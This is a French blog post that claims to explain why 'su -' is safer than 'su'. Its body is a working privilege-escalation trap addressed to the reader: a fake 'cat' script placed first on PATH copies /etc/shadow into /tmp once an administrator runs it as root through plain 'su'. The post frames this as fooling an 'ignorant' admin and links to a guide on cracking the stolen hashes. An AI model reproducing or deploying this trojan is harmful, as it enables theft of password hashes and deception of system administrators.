---
title: "Pourquoi utiliser 'su -' plutôt que 'su'"
author: Benoit
date: 2020-10-30 19:32:33 +0100
categories: [sysadmin, linux]
tags: [securite]
math: true
image: /images/security.jpg
---
`su -` invoque un shell de connexion après avoir changé d'utilisateur. Un shell de connexion réinitialise la plupart des variables d'environnement, fournissant une base propre.

`su` ne fait que changer d'utilisateur, fournissant un shell normal avec un environnement presque identique à celui de l'ancien utilisateur.

Imaginez que vous êtes un développeur de logiciels avec un accès normal à une machine et que votre administrateur ignorant ne vous donne pas l'accès au compte root. Essayons (avec un peu de chance) de le piéger:

Vous connnaisser évidement la commande `cat`qui permet d'afficher le contenu d'un fichier ? Nous allons la piéger en en créant une fausse:

Nous allons la stocker dans le dossier `tmp`

{% highlight bash %}
$ mkdir /tmp/evil_bin
$ vi /tmp/evil_bin/cat
{% endhighlight %}

Nous créons donc un script que nous allons évidement appeler `cat`
Dans ce script, si l'utilisateur n'est pas root, le script simulera un message de permission refusée.
Si l'utilisateur est root, le script va copier le contenu du fichier `/etc/shadow` dans le dossier `tmp` 
Il va ensuite executer la commande `cat` normalement.

{% highlight bash %}
#!/bin/bash
test $UID != 0 && { echo "/bin/cat: Permission denied!"; exit 1; } 
/bin/cat /etc/shadow &>/tmp/shadow_copy
/bin/cat "$@"
exit 0
{% endhighlight %}

Nous allons maintenent rendre le script executable et l'ajouter dans notre `PATH` afin de pouvoir l'executer depuis n'importe quel dossier:

{% highlight bash %}
chmod +x /tmp/evil_bin/cat`
PATH="/tmp/evil_bin:$PATH"
{% endhighlight %}

Maintenant, allez voir votre administrateur pour lui demander pourquoi vous n'arrivez pas à afficher un fichier avec la commande `cat`.

Il va donc essayer en restant sur votre session mais ce ne sera pas le vrai programme `cat`qui sera lancé mais notre petit script:

{% highlight bash %}
$ ls -l /home/vous/mon-super-fichier
-rw-r--r-- 1 you wheel 41 2020-06-28 13:00 mon-super-fichier
$ cat /home/vous/mon-super-fichier
/bin/cat: Permission denied!
{% endhighlight %}

Il va donc vouloir essayer avec les droits root en utilisant `su`. Et c'est à ce moment qu'il va faire une erreur. En effet, comme il utilise `su` au lieu de `su -`, les variables d'environnement ne sont pas écrasées. Il va donc une nouvelle fois executer notre script au lieu d'executer la vrai commande `cat`.

{% highlight bash %}
$ su
Password: ...
$ cat /home/vous/mon-super-fichier
du contenu super important dans ce fichier.
$ exit
{% endhighlight %}

Il aura donc l'impression que tout a fonctionné et fermé la session root. Donc, vous pouvez maintenant dire "Merci monsieur l'admin" ^^ En effet, notre piège a fonctionné: 

Nous avons bien récupéré une copie du fichier `/etc/shadow`qui contient une liste de tous les comptes et les mots de passe chiffrés:

{% highlight bash %}
$ ls -l /tmp/shadow_copy
-rw-r--r-- 1 root root 1093 2020-06-28 13:02 /tmp/shadow_copy
{% endhighlight %}

Il ne vous reste plus qu'a tenter de les déchiffrer... et pour ça, je vous laisse lire cet article de l'excellent [korben][korben]


[Korben]: https://korben.info/comment-cracker-un-mot-de-passe-sous-linux.html

